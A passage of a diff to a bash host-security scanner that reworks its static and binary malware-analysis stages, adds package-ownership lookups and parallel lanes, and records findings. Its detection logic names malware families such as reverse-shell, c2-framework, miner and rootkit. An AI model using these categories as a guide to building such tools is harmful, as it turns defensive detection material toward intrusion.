+                --max-bytes 4194304 --max-decode-depth 3 --max-decoded-bytes 4194304 \
+                --max-archive-members 200 --max-archive-bytes 33554432 --max-compression-ratio 50 \
+                --pack "$DETECT_PACK_PATH")
+            [ -n "$PACKAGE_OWNER_CACHE_FILE" ] && [ -s "$PACKAGE_OWNER_CACHE_FILE" ] && \
+                lane_args+=(--owner-index "$PACKAGE_OWNER_CACHE_FILE")
+            if [ "$STATE_ENABLED" = true ] && [ "$SCAN_PROFILE" != corpus-validation ]; then
+                lane_args+=(--analysis-baseline "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache"
+                    --analysis-cache-out "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache")
+            fi
+            run_with_timeout "$((stage_timeout + 2))" python3 "$DETECT_ENGINE_PATH" "${lane_args[@]}" > "$summary" 2>&1 || rc=$?
+        elif [ -x "$NATIVE_SCANNER_PATH" ]; then
+            local -a lane_args=(analyze-static --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --timeout-seconds "$stage_timeout" \
+                --max-bytes 4194304 --max-decode-depth 3 --max-decoded-bytes 4194304 \
+                --max-archive-members 200 --max-archive-bytes 33554432 --max-compression-ratio 50)
+            if [ "$STATE_ENABLED" = true ] && [ "$SCAN_PROFILE" != corpus-validation ]; then
+                lane_args+=(--analysis-baseline "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache"
+                    --analysis-cache-out "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache")
+            fi
+            run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" "${lane_args[@]}" > "$summary" 2>&1 || rc=$?
+        fi
+        printf '%s' "$rc" > "${RAW_DIR}/.static-engine-rc.${RUN_ID}" 2>/dev/null || true
+        return 0
+    fi
+    if [ "${SECSCOPE_LANE_RICHEN_ONLY:-}" = "1" ]; then
+        # 富化-only：引擎已在并行阶段落盘，这里恢复 rc 后直接进入摘要/富化。
+        rc=$(cat "${RAW_DIR}/.static-engine-rc.${RUN_ID}" 2>/dev/null || printf 125)
+        [ "$rc" = "125" ] && mark_current_module_partial static_lane_engine_rc_missing
+    elif [ "$stage_timeout" -le 0 ]; then
         printf '{"detector":"secscope-bounded-static","status":"PARTIAL","timeout":true,"scanned_files":0,"reason":"shared_pipeline_budget_exhausted"}\n' > "$out"
         cp "$out" "$summary"; : > "$projection"
         record_raw_status 'static-analysis.jsonl' PARTIAL filesystem 'shared_pipeline_budget_exhausted'
         mark_current_module_partial static_pipeline_budget_exhausted_before_language_analysis
         return 0
     fi
-    if [ ! -x "$NATIVE_SCANNER_PATH" ]; then
-        printf '{"detector":"secscope-bounded-static","status":"UNAVAILABLE","visibility_gaps":["native_static_analyzer_missing"]}\n' > "$out"
-        record_raw_status 'static-analysis.jsonl' UNAVAILABLE filesystem 'native static analyzer missing'
-        mark_current_module_partial static_language_adapters_unavailable
-        return 0
+    if [ "${SECSCOPE_LANE_RICHEN_ONLY:-}" != "1" ]; then
+        # v2 引擎优先：加权家族签名检测；python3/引擎不可用时回退 native scanner。
+        if command -v python3 >/dev/null 2>&1 && [ -r "$DETECT_ENGINE_PATH" ] && [ -r "$DETECT_PACK_PATH" ]; then
+            local -a static_native_args=(analyze-static --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --timeout-seconds "$stage_timeout" \
+                --max-bytes 4194304 --max-decode-depth 3 --max-decoded-bytes 4194304 \
+                --max-archive-members 200 --max-archive-bytes 33554432 --max-compression-ratio 50 \
+                --pack "$DETECT_PACK_PATH")
+            [ -n "$PACKAGE_OWNER_CACHE_FILE" ] && [ -s "$PACKAGE_OWNER_CACHE_FILE" ] && \
+                static_native_args+=(--owner-index "$PACKAGE_OWNER_CACHE_FILE")
+            # 未变化文件重放上一轮分析结果，稳态运行只分析新增/修改文件。
+            if [ "$STATE_ENABLED" = true ] && [ "$SCAN_PROFILE" != corpus-validation ]; then
+                static_native_args+=(--analysis-baseline "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache"
+                    --analysis-cache-out "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache")
+            fi
+            run_with_timeout "$((stage_timeout + 2))" python3 "$DETECT_ENGINE_PATH" "${static_native_args[@]}" > "$summary" 2>&1 || rc=$?
+        elif [ -x "$NATIVE_SCANNER_PATH" ]; then
+            local -a static_native_args=(analyze-static --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --timeout-seconds "$stage_timeout" \
+                --max-bytes 4194304 --max-decode-depth 3 --max-decoded-bytes 4194304 \
+                --max-archive-members 200 --max-archive-bytes 33554432 --max-compression-ratio 50)
+            # 未变化文件重放上一轮分析结果，稳态运行只分析新增/修改文件。
+            if [ "$STATE_ENABLED" = true ] && [ "$SCAN_PROFILE" != corpus-validation ]; then
+                static_native_args+=(--analysis-baseline "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache"
+                    --analysis-cache-out "${STATE_DIR}/static_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache")
+            fi
+            run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" "${static_native_args[@]}" > "$summary" 2>&1 || rc=$?
+        else
+            printf '{"detector":"secscope-unified-static","status":"UNAVAILABLE","visibility_gaps":["static_analyzer_missing"]}\n' > "$out"
+            record_raw_status 'static-analysis.jsonl' UNAVAILABLE filesystem 'static analyzer missing'
+            mark_current_module_partial static_language_adapters_unavailable
+            return 0
+        fi
     fi
-    run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" analyze-static --input-list "$candidate_file" \
-        --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --timeout-seconds "$stage_timeout" \
-        --max-bytes 4194304 --max-decode-depth 3 --max-decoded-bytes 4194304 \
-        --max-archive-members 200 --max-archive-bytes 33554432 --max-compression-ratio 50 > "$summary" 2>&1 || rc=$?
     chmod 600 "$out" "$summary" 2>/dev/null || true
     grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"' "$summary" && native_status=PARTIAL || true
     expected_count=$(wc -l < "$candidate_file" | tr -d ' ')
     scanned_count=$(python3 - "$summary" <<'PY' 2>/dev/null || printf 0
 import json, sys
-print(int(json.load(open(sys.argv[1], encoding="utf-8")).get("scanned_files", 0) or 0))
+try:
+    data = json.load(open(sys.argv[1], encoding="utf-8"))
+except Exception:
+    print(0); raise SystemExit
+# v2.3（审计 R2）：detect_engine 写 "scanned"，native 写 "scanned_files"，
+# 此前只读后者导致统一引擎路径 scanned_count 恒 0 → 每轮误标 PARTIAL。
+print(int(data.get("scanned") or data.get("scanned_files") or 0))
 PY
     )
     if [ "${scanned_count:-0}" -ne "${expected_count:-0}" ]; then
@@ -4760,18 +5325,30 @@ PY
         record_raw_status 'static-analysis.jsonl' PARTIAL filesystem "$([ "$rc" -ne 0 ] && printf 'adapter_exit_%s' "$rc" || printf 'native_summary_partial')"
         mark_current_module_partial "$([ "$rc" -ne 0 ] && printf 'static_adapter_exit_%s' "$rc" || printf 'static_adapter_summary_partial')"
     fi
-    # Results are structural evidence.  Even HIGH_RISK_STRUCTURE is not an
-    # automatic malware verdict without a second independent event/data source.
+    # v2 引擎投影: path|language|classification|score|sha256|family|capabilities|matched_rules|counter
     if [ -r "$projection" ]; then
-        while IFS=$'\t' read -r path language classification score sha capabilities edges counter; do
+        while IFS=$'\t' read -r path language classification score sha family capabilities rules counter; do
             [ -n "$path" ] || continue
             [ "$classification" != OBSERVE ] || continue
+            # 家族签名命中（如 webshell 家族标识串、stratum 配置）→ 高置信威胁；
+            # 其余结构评分 → 中置信异常，等待运行时/HTTP 关联升级。
+            if [ -n "$family" ] && [ "$family" != none ] && [ "$classification" = HIGH_RISK_STRUCTURE ]; then
+                record_find HIGH malware-engine "恶意文件家族签名命中: $path" \
+                    "family=$family; classification=$classification; score=$score; sha256=$sha; matched_rules=$rules; capabilities=$capabilities" \
+                    '隔离样本并核对哈希来源；结合 HTTP 访问与进程证据确认利用路径' 'T1505.003' \
+                    'FS-FAMILY-SIGNATURE' "$path" 'static-analysis.jsonl,static-analysis-projection.tsv' 'SECURITY_THREAT' HIGH \
+                    '内容命中高特异性家族特征组合（唯一性标识串或输入-执行因果链）' \
+                    '框架/合法软件守卫已抑制常见误报；组织确认合法时降级' 'FILE,INTEGRITY' \
+                    "counter_evidence=${counter:-none}; adapter never loads or executes target" \
+                    "$RUN_STARTED_AT|FILE|family=$family $path"
+                continue
+            fi
             record_find "$([ "$classification" = HIGH_RISK_STRUCTURE ] && printf HIGH || printf MEDIUM)" webshell \
                 "${language} 高风险能力结构: $path" \
-                "classification=$classification; score=$score; sha256=$sha; capabilities=$capabilities; causal_edges=$edges" \
+                "classification=$classification; score=$score; sha256=$sha; family=${family:-none}; capabilities=$capabilities; matched_rules=$rules" \
                 '与文件基线、HTTP、写入进程、执行和网络事件按实体关联；不执行目标代码' 'T1505.003' \
-                'STATIC-BOUNDED-DEOBFUSCATION' "$path" 'static-analysis.jsonl,static-coverage.jsonl' 'SECURITY_ANOMALY' MEDIUM \
-                '有界解码后发现多能力数据流结构，仅为文件静态数据源' \
+                'STATIC-BOUNDED-DEOBFUSCATION' "$path" 'static-analysis.jsonl,static-analysis-projection.tsv' 'SECURITY_ANOMALY' MEDIUM \
+                '有界解码后发现多能力数据流结构或家族弱特征，仅为文件静态数据源' \
                 '需同实体的独立运行时、HTTP、写入或网络证据才能升级' 'FILE' \
                 "counter_evidence=${counter:-none}; adapter never loads or executes target" \
                 "$RUN_STARTED_AT|FILE|$classification $path"
@@ -4779,10 +5356,76 @@ PY
     fi
 }
 
+# v2：对二进制候选批量做包归属查询（一次 fork 处理一批），写入
+# PACKAGE_OWNER_CACHE_FILE 供检测引擎做包归属折扣。修复 v1.1 首轮无归属
+# 索引导致 /usr/bin/bash（/dev/tcp 支持自带 socket/connect 导入）被误判。
+build_package_owner_bulk() {
+    local candidate_file="$1"
+    [ -n "$PACKAGE_OWNER_CACHE_FILE" ] && [ -s "$PACKAGE_OWNER_CACHE_FILE" ] && return 0
+    case "$PKG_MGR" in
+        dpkg|rpm) ;;
+        *) return 0 ;;
+    esac
+    [ -s "$candidate_file" ] || return 0
+    PACKAGE_OWNER_CACHE_FILE="${OUTPUT_DIR:-${TMPDIR:-/tmp}}/.package-owner-cache.${RUN_ID}"
+    : > "$PACKAGE_OWNER_CACHE_FILE" 2>/dev/null || return 0
+    # usrmerge 兼容：Ubuntu/RHEL 合并 /bin→/usr/bin 后，dpkg/rpm 库里仍是
+    # 经典路径（/bin/bash），按 /usr 路径查询会落空（v1.1 实测 /usr/bin/bash
+    # 因此绕过包归属折扣被误判为反弹 shell）。对 /usr/{bin,sbin,lib,lib64}
+    # 路径同时查询其经典别名，命中后双向写入。
+    local alias_file="${candidate_file}.aliases"
+    awk '{print} /^\/usr\/(bin|sbin|lib|lib64)\// {sub(/^\/usr/, ""); print}' "$candidate_file" > "$alias_file" 2>/dev/null || cp "$candidate_file" "$alias_file"
+    if [ "$PKG_MGR" = dpkg ] && command -v dpkg-query >/dev/null 2>&1; then
+        xargs -r -n 50 dpkg-query -S -- < "$alias_file" 2>/dev/null | \
+            awk -F': ' '{path=$0; sub(/^.*: /,"",path); pkg=$0; sub(/: .*/,"",pkg); if (path != "" && pkg != "") print path "\tdpkg:" pkg}' \
+            >> "$PACKAGE_OWNER_CACHE_FILE"
+        awk -F'\t' 'NF>=2 {print; if ($1 !~ /^\/usr\//) print "/usr" $1 "\t" $2}' "$PACKAGE_OWNER_CACHE_FILE" \
+            >> "${PACKAGE_OWNER_CACHE_FILE}.usr" 2>/dev/null && \
+            { sort -u -t$'\t' -k1,1 "${PACKAGE_OWNER_CACHE_FILE}.usr" > "${PACKAGE_OWNER_CACHE_FILE}.final" 2>/dev/null && \
+              mv "${PACKAGE_OWNER_CACHE_FILE}.final" "$PACKAGE_OWNER_CACHE_FILE"; }
+        rm -f "${PACKAGE_OWNER_CACHE_FILE}.usr"
+    elif [ "$PKG_MGR" = rpm ] && command -v rpm >/dev/null 2>&1; then
+        xargs -r -n 40 rpm -qf -- < "$alias_file" 2>/dev/null | paste -d '\t' - "$alias_file" 2>/dev/null | \
+            awk -F '\t' '$1 !~ /not owned|不属于任何/ {print $2 "\trpm:" $1}' >> "$PACKAGE_OWNER_CACHE_FILE"
+    fi
+    rm -f "$alias_file"
+    chmod 600 "$PACKAGE_OWNER_CACHE_FILE" 2>/dev/null || true
+}
+
 run_binary_analyzers() {
     local candidate_file="${1:-$STATIC_CANDIDATE_FILE}"
-    local out="${RAW_DIR}/binary-analysis.jsonl" summary="${RAW_DIR}/binary-analysis-summary.json" enriched="${RAW_DIR}/binary-analysis-enriched.tsv" projection="${RAW_DIR}/binary-analysis-projection.tsv" rc=0 native_status=SUCCESS stage_timeout="${STATIC_STAGE_TIMEOUT:-$YARA_TOTAL_TIMEOUT}"
-    if [ "$stage_timeout" -le 0 ]; then
+    local out="${RAW_DIR}/binary-analysis.jsonl" summary="${RAW_DIR}/binary-analysis-summary.json" enriched="${RAW_DIR}/binary-analysis-enriched.tsv" projection="${RAW_DIR}/binary-analysis-projection.tsv" rc=0 native_status=SUCCESS stage_timeout="${STATIC_STAGE_TIMEOUT:-$STATIC_TOTAL_TIMEOUT}"
+    # v2.3 lane 并行：同 static lane，ENGINE_ONLY 模式只跑引擎落盘。
+    if [ "${SECSCOPE_LANE_ENGINE_ONLY:-}" = "1" ]; then
+        if [ "$stage_timeout" -le 0 ]; then
+            printf '{"detector":"secscope-unified-binary","status":"PARTIAL","timeout":true,"scanned":0}\n' > "$out"
+            printf '%s' "0" > "${RAW_DIR}/.binary-engine-rc.${RUN_ID}" 2>/dev/null || true
+            return 0
+        fi
+        if command -v python3 >/dev/null 2>&1 && [ -r "$DETECT_ENGINE_PATH" ] && [ -r "$DETECT_PACK_PATH" ]; then
+            local -a lane_args=(analyze-binary --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --max-bytes 33554432 --timeout-seconds "$stage_timeout" \
+                --pack "$DETECT_PACK_PATH")
+            [ -n "$FILE_HASH_INDEX_FILE" ] && [ -s "$FILE_HASH_INDEX_FILE" ] && lane_args+=(--hash-index "$FILE_HASH_INDEX_FILE")
+            [ -n "$PACKAGE_OWNER_CACHE_FILE" ] && [ -s "$PACKAGE_OWNER_CACHE_FILE" ] && lane_args+=(--owner-index "$PACKAGE_OWNER_CACHE_FILE")
+            if [ "$STATE_ENABLED" = true ] && [ "$SCAN_PROFILE" != corpus-validation ]; then
+                lane_args+=(--analysis-baseline "${STATE_DIR}/binary_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache"
+                    --analysis-cache-out "${STATE_DIR}/binary_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache")
+            fi
+            run_with_timeout "$((stage_timeout + 2))" python3 "$DETECT_ENGINE_PATH" "${lane_args[@]}" > "$summary" 2>&1 || rc=$?
+        elif [ -x "$NATIVE_SCANNER_PATH" ]; then
+            local -a lane_args=(analyze-binary --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --max-bytes 33554432 --timeout-seconds "$stage_timeout")
+            [ -n "$FILE_HASH_INDEX_FILE" ] && [ -s "$FILE_HASH_INDEX_FILE" ] && lane_args+=(--hash-index "$FILE_HASH_INDEX_FILE")
+            run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" "${lane_args[@]}" > "$summary" 2>&1 || rc=$?
+        fi
+        printf '%s' "$rc" > "${RAW_DIR}/.binary-engine-rc.${RUN_ID}" 2>/dev/null || true
+        return 0
+    fi
+    if [ "${SECSCOPE_LANE_RICHEN_ONLY:-}" = "1" ]; then
+        rc=$(cat "${RAW_DIR}/.binary-engine-rc.${RUN_ID}" 2>/dev/null || printf 125)
+        [ "$rc" = "125" ] && mark_current_module_partial binary_lane_engine_rc_missing
+    elif [ "$stage_timeout" -le 0 ]; then
         printf '{"detector":"SecScope.BinaryAnalyzer","status":"PARTIAL","scanned":0,"reason":"shared_pipeline_budget_exhausted"}\n' > "$out"
         cp "$out" "$summary"; : > "$projection"
         printf 'file_path\tformat\tsha256\tmd5\tpackage_owner\tsignature_status\trisk_score\tapi_combinations\tstructural_anomalies\n' > "$enriched"
@@ -4791,26 +5434,64 @@ run_binary_analyzers() {
         mark_current_module_partial static_pipeline_budget_exhausted_before_binary_analysis
         return 0
     fi
-    if [ ! -x "$NATIVE_SCANNER_PATH" ]; then
-        printf '{"detector":"SecScope.BinaryAnalyzer","status":"UNAVAILABLE","visibility_gaps":["native_binary_analyzer_missing"]}\n' > "$out"
-        record_raw_status 'binary-analysis.jsonl' UNAVAILABLE filesystem 'native PE/ELF analyzer unavailable'
-        mark_current_module_partial binary_analyzer_unavailable
-        return 0
+    if [ "${SECSCOPE_LANE_RICHEN_ONLY:-}" != "1" ]; then
+        if command -v python3 >/dev/null 2>&1 && [ -r "$DETECT_ENGINE_PATH" ] && [ -r "$DETECT_PACK_PATH" ]; then
+            local -a binary_native_args=(analyze-binary --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --max-bytes 33554432 --timeout-seconds "$stage_timeout" \
+                --pack "$DETECT_PACK_PATH")
+            # 复用 file-monitor 哈希索引免重复全文摘要；未变化文件重放上轮分析结果。
+            [ -n "$FILE_HASH_INDEX_FILE" ] && [ -s "$FILE_HASH_INDEX_FILE" ] && binary_native_args+=(--hash-index "$FILE_HASH_INDEX_FILE")
+            build_package_owner_bulk "$candidate_file"
+            [ -n "$PACKAGE_OWNER_CACHE_FILE" ] && [ -s "$PACKAGE_OWNER_CACHE_FILE" ] && binary_native_args+=(--owner-index "$PACKAGE_OWNER_CACHE_FILE")
+            if [ "$STATE_ENABLED" = true ] && [ "$SCAN_PROFILE" != corpus-validation ]; then
+                binary_native_args+=(--analysis-baseline "${STATE_DIR}/binary_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache"
+                    --analysis-cache-out "${STATE_DIR}/binary_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache")
+            fi
+            run_with_timeout "$((stage_timeout + 2))" python3 "$DETECT_ENGINE_PATH" "${binary_native_args[@]}" > "$summary" 2>&1 || rc=$?
+        elif [ -x "$NATIVE_SCANNER_PATH" ]; then
+            local -a binary_native_args=(analyze-binary --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --max-bytes 33554432 --timeout-seconds "$stage_timeout")
+            [ -n "$FILE_HASH_INDEX_FILE" ] && [ -s "$FILE_HASH_INDEX_FILE" ] && binary_native_args+=(--hash-index "$FILE_HASH_INDEX_FILE")
+            if [ "$STATE_ENABLED" = true ] && [ "$SCAN_PROFILE" != corpus-validation ]; then
+                binary_native_args+=(--analysis-baseline "${STATE_DIR}/binary_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache"
+                    --analysis-cache-out "${STATE_DIR}/binary_analysis.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.cache")
+            fi
+            run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" "${binary_native_args[@]}" > "$summary" 2>&1 || rc=$?
+        else
+            printf '{"detector":"secscope-unified-binary","status":"UNAVAILABLE","visibility_gaps":["binary_analyzer_missing"]}\n' > "$out"
+            record_raw_status 'binary-analysis.jsonl' UNAVAILABLE filesystem 'PE/ELF analyzer unavailable'
+            mark_current_module_partial binary_analyzer_unavailable
+            return 0
+        fi
     fi
-    run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" analyze-binary --input-list "$candidate_file" \
-        --output-jsonl "$out" --projection-tsv "$projection" --max-files "$YARA_MAX_FILES" --max-bytes 33554432 --timeout-seconds "$stage_timeout" > "$summary" 2>&1 || rc=$?
-    printf 'file_path\tformat\tsha256\tmd5\tpackage_owner\tsignature_status\trisk_score\tapi_combinations\tstructural_anomalies\n' > "$enriched"
-    while IFS=$'\t' read -r path format sha md5 signature score combos anomalies; do
+    printf 'file_path\tformat\tsha256\tmd5\tpackage_owner\tsignature_status\trisk_score\tfamily\tmatched_rules\tstructural_anomalies\n' > "$enriched"
+    while IFS=$'\t' read -r path format sha md5 signature score family rules anomalies; do
         [ -n "$path" ] || continue
-        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$format" "$sha" "$md5" "$(file_package_owner "$path")" "$signature" "$score" "$combos" "$anomalies" >> "$enriched"
+        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$format" "$sha" "$md5" "$(file_package_owner "$path")" "$signature" "$score" "${family:-none}" "$rules" "$anomalies" >> "$enriched"
+        # 家族签名命中（挖矿/代理/C2/rootkit/反弹shell特征串）是强文件证据，
+        # 与恶意哈希同级：直接进入威胁视图，无需凑满三个证据域。
+        case "${family:-none}" in
+            miner|proxy-tool|c2-framework|rootkit|reverse-shell)
+                if [ "${score:-0}" -ge 45 ]; then
+                    record_find HIGH malware-engine "ELF/PE 命中恶意家族签名: $path" \
+                        "family=$family; sha256=$sha; md5=$md5; risk_score=$score; matched_rules=$rules; anomalies=$anomalies" \
+                        '核对文件来源与哈希，隔离样本；结合进程与网络证据确认活动状态' 'T1204.002' \
+                        'FS-FAMILY-SIGNATURE' "$path" 'binary-analysis.jsonl,binary-analysis-enriched.tsv' 'SECURITY_THREAT' HIGH \
+                        '二进制内命中高特异性家族特征串组合（如 stratum 协议/代理工具唯一命令/家族标识）' \
+                        '组织确认同哈希合法或同包管理器归属时降级' 'FILE,INTEGRITY' \
+                        '家族签名来自行为/结构特征组合而非单点字符串，误报率低；包归属文件已折扣' \
+                        "$RUN_STARTED_AT|FILE|family=$family score=$score"
+                    continue
+                fi ;;
+        esac
         [ "${score:-0}" -ge 20 ] || continue
         record_find MEDIUM rat "可执行文件静态行为组合待研判: $path" \
-            "format=$format; sha256=$sha; md5=$md5; risk_score=$score; api_combinations=$combos; anomalies=$anomalies" \
+            "format=$format; sha256=$sha; md5=$md5; risk_score=$score; family=${family:-none}; matched_rules=$rules; anomalies=$anomalies" \
             '关联同一进程实例的执行、网络、注入与持久化；静态 API/熵/路径不单独定性' 'T1027' \
             'RAT-BINARY-STRUCTURE' "$path" 'binary-analysis.jsonl,binary-analysis-enriched.tsv' 'SECURITY_ANOMALY' LOW \
             '纯字节解析发现高风险 API 组合或多个结构异常，未执行目标文件' \
             '同实体出现公网周期通信、注入、持久化或确认恶意哈希时升级' 'FILE' \
-            '无签名、高熵、临时路径和加壳均被限制为弱证据' "$RUN_STARTED_AT|FILE|binary metadata score=$score"
+            '无签名、高熵、临时路径和加壳均被限制为弱证据；包管理器归属文件已折扣' "$RUN_STARTED_AT|FILE|binary metadata score=$score"
     done < <(tail -n +2 "$projection")
     chmod 600 "$out" "$summary" "$enriched" 2>/dev/null || true
     grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"' "$summary" && native_status=PARTIAL || true
@@ -4828,12 +5509,11 @@ route_static_candidates() {
     local summary="${RAW_DIR}/static-routing-summary.json" rc=0 candidate_count=0 route_status=SUCCESS
     STATIC_WEB_CANDIDATE_FILE="${RAW_DIR}/static-web-candidates.txt"
     STATIC_BINARY_CANDIDATE_FILE="${RAW_DIR}/static-binary-candidates.txt"
-    STATIC_YARA_CANDIDATE_FILE="${RAW_DIR}/static-yara-candidates.txt"
     candidate_count=$(wc -l < "$STATIC_CANDIDATE_FILE" 2>/dev/null | tr -d ' '); candidate_count=${candidate_count:-0}
     if command -v python3 >/dev/null 2>&1 && [ -r "$STATIC_ROUTER_PATH" ]; then
         run_with_timeout 30 python3 "$STATIC_ROUTER_PATH" --input-list "$STATIC_CANDIDATE_FILE" \
             --web-output "$STATIC_WEB_CANDIDATE_FILE" --binary-output "$STATIC_BINARY_CANDIDATE_FILE" \
-            --yara-output "$STATIC_YARA_CANDIDATE_FILE" --summary "$summary" > "${RAW_DIR}/static-routing.log" 2>&1 || rc=$?
+            --summary "$summary" > "${RAW_DIR}/static-routing.log" 2>&1 || rc=$?
     else
         rc=125
     fi
@@ -4841,39 +5521,53 @@ route_static_candidates() {
         route_status=PARTIAL
         cp "$STATIC_CANDIDATE_FILE" "$STATIC_WEB_CANDIDATE_FILE"
         cp "$STATIC_CANDIDATE_FILE" "$STATIC_BINARY_CANDIDATE_FILE"
-        cp "$STATIC_CANDIDATE_FILE" "$STATIC_YARA_CANDIDATE_FILE"
-        printf '{"schema_version":1,"router":"fallback-all","status":"PARTIAL","input_candidates":%d,"web_candidates":%d,"binary_candidates":%d,"yara_candidates":%d,"reason":"router_exit_%d"}\n' \
-            "$candidate_count" "$candidate_count" "$candidate_count" "$candidate_count" "$rc" > "$summary"
+        printf '{"schema_version":1,"router":"fallback-all","status":"PARTIAL","input_candidates":%d,"web_candidates":%d,"binary_candidates":%d,"reason":"router_exit_%d"}\n' \
+            "$candidate_count" "$candidate_count" "$candidate_count" "$rc" > "$summary"
         mark_current_module_partial "static_router_fallback_exit_${rc}"
     elif [ "$rc" -eq 2 ]; then
         route_status=PARTIAL
         mark_current_module_partial static_router_unreadable_or_unstable_candidates
     fi
-    chmod 600 "$STATIC_WEB_CANDIDATE_FILE" "$STATIC_BINARY_CANDIDATE_FILE" "$STATIC_YARA_CANDIDATE_FILE" "$summary" "${RAW_DIR}/static-routing.log" 2>/dev/null || true
-    record_raw_status 'static-routing-summary.json' "$route_status" filesystem "router_exit=${rc};high_recall_yara_lane=true"
+    chmod 600 "$STATIC_WEB_CANDIDATE_FILE" "$STATIC_BINARY_CANDIDATE_FILE" "$summary" "${RAW_DIR}/static-routing.log" 2>/dev/null || true
+    record_raw_status 'static-routing-summary.json' "$route_status" filesystem "router_exit=${rc}"
     record_raw_status 'static-web-candidates.txt' "$route_status" filesystem 'L1 text/archive/web routing'
     record_raw_status 'static-binary-candidates.txt' "$route_status" filesystem 'L1 ELF/PE magic routing'
-    record_raw_status 'static-yara-candidates.txt' "$route_status" yara 'all readable regular candidates'
 }
 
 scan_web_static_structures() {
     local out="${RAW_DIR}/web-static-analysis.tsv" path result score reasons entropy long_line hash owner count=0 projection_hash
     declare -A static_hash_by_path=()
-    printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tyara\n' > "$out"
-    # Static discovery, YARA, language analysis, binary analysis and shell
-    # scoring share one profile budget. Full must not multiply its 300-second
+    printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tpipeline\n' > "$out"
+    # Static discovery, language analysis, binary analysis and shell scoring
+    # share one profile budget. Full must not multiply its 300-second
     # constrained-host budget across every sub-stage.
-    STATIC_PIPELINE_DEADLINE=$((SECONDS + YARA_TOTAL_TIMEOUT))
-    static_pipeline_stage_budget 5 || true
+    STATIC_PIPELINE_DEADLINE=$((SECONDS + STATIC_TOTAL_TIMEOUT))
+    # 发现阶段面对的根目录常有数十万文件，1/5 的均分预算不够；给它 40%，
+    # 其余三个阶段分摊剩余 60%。
+    STATIC_STAGE_TIMEOUT=$((STATIC_TOTAL_TIMEOUT * 2 / 5)); [ "$STATIC_STAGE_TIMEOUT" -ge 1 ] || STATIC_STAGE_TIMEOUT=1
+    benchmark_stage_begin static_discovery
     build_static_candidate_list || true
+    benchmark_stage_end static_discovery
     route_static_candidates
-    static_pipeline_stage_budget 4 || true
-    scan_yara_candidates "$STATIC_YARA_CANDIDATE_FILE"
     static_pipeline_stage_budget 3 || true
-    run_static_language_adapters "$STATIC_WEB_CANDIDATE_FILE"
-    static_pipeline_stage_budget 2 || true
-    run_binary_analyzers "$STATIC_BINARY_CANDIDATE_FILE"
+    # v2.3 lane 并行：静态/二进制两 lane 的引擎进程相互独立（独立输出文件、
+    # 独立候选清单），后台并行使墙钟从 sum(A,B) 变为 max(A,B)；record_find
+    # 富化必须留在父进程（子 shell 数组写会丢失），故 ENGINE_ONLY 后台跑、
+    # wait 后以 RICHEN_ONLY 模式执行摘要/状态/富化。
+    benchmark_stage_begin static_language_adapters
+    benchmark_stage_begin binary_analysis
+    SECSCOPE_LANE_ENGINE_ONLY=1 run_static_language_adapters "$STATIC_WEB_CANDIDATE_FILE" &
+    STATIC_LANE_PID=$!
+    SECSCOPE_LANE_ENGINE_ONLY=1 run_binary_analyzers "$STATIC_BINARY_CANDIDATE_FILE" &
+    BINARY_LANE_PID=$!
+    wait $STATIC_LANE_PID || true
+    wait $BINARY_LANE_PID || true
+    SECSCOPE_LANE_RICHEN_ONLY=1 run_static_language_adapters "$STATIC_WEB_CANDIDATE_FILE"
+    SECSCOPE_LANE_RICHEN_ONLY=1 run_binary_analyzers "$STATIC_BINARY_CANDIDATE_FILE"
+    benchmark_stage_end static_language_adapters
+    benchmark_stage_end binary_analysis
     static_pipeline_stage_budget 1 || true
+    benchmark_stage_begin static_shell_scoring
     if [ -r "${RAW_DIR}/static-analysis-projection.tsv" ]; then
         while IFS=$'\t' read -r path _ _ _ projection_hash _; do [ -n "$path" ] && [ -n "$projection_hash" ] && static_hash_by_path["$path"]="$projection_hash"; done < <(tail -n +2 "${RAW_DIR}/static-analysis-projection.tsv")
     fi
